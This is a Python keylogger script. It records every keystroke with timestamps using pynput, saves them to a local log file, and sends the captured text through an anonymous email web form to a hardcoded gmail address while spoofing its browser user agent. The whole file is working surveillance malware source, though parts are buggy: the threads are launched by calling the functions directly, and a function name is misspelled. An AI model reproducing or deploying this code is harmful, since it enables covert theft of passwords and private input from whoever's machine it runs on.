from pynput import keyboard
from threading import Timer, Thread
from multiprocessing import Process
import logging, datetime
import mechanize
import sched, time
message = ""
logging.basicConfig(filename="keylog.log", filemode="w",format='%(asctime)s %(message)s', level=logging.INFO)
logging.info("----------Logging at {0}----------\n".format(datetime.datetime.now()));

def on_press(key):
	global message
	timenow = datetime.datetime.now()
	logging.info("{0} : key {1} pressed\n".format(timenow,key));
	message += "{0} : key {1} pressed\n".format(timenow,key)

def send_mail():
	time.sleep(5);
	print("beginning sending mail")
	br = mechanize.Browser()

	to = "e154248e91ef8eae65159fa4083747@gmail.com"
	subject = "keylog-info"

	#proxy = "http://127.0.0.1:8080"

	url = "http://anonymouse.org/anonemail.html"
	headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
	br.addheaders = [('User-agent', headers)]
	br.open(url)
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_debug_http(False)
	br.set_debug_redirects(False)
	#br.set_proxies({"http": proxy})

	br.select_form(nr=0)

	br.form['to'] = to
	br.form['subject'] = subject
	br.form['text'] = message
	print("Filled in")
	result = br.submit()

	response = br.response().read()
	print("Got responded")

	if "The e-mail has been sent anonymously!" in response:
    		print("The email has been sent successfully!! \n The recipient will get it in 12 hours!!")
	else:
    		print("Failed to send email!")
	print("Message sent: ")

def start_logging():	
	with keyboard.Listener(on_press=on_press) as listener:
		print("start capturing...")
		listener.join()
if __name__ == '__main__':
	p1 = Thread(target = start_logging())
	p1.start()
	p2 = Thread(target = send_mail())
	p2.start()
	p1.join()
	p2.join()

def runInParallel(*fns):
	proc = []
	for fn in fns:
		p = Process(target=fn)
		p.start()
		proc.append(p)
	for p in proc:
		p.join()

runInParallel(start_logging,send_mai)
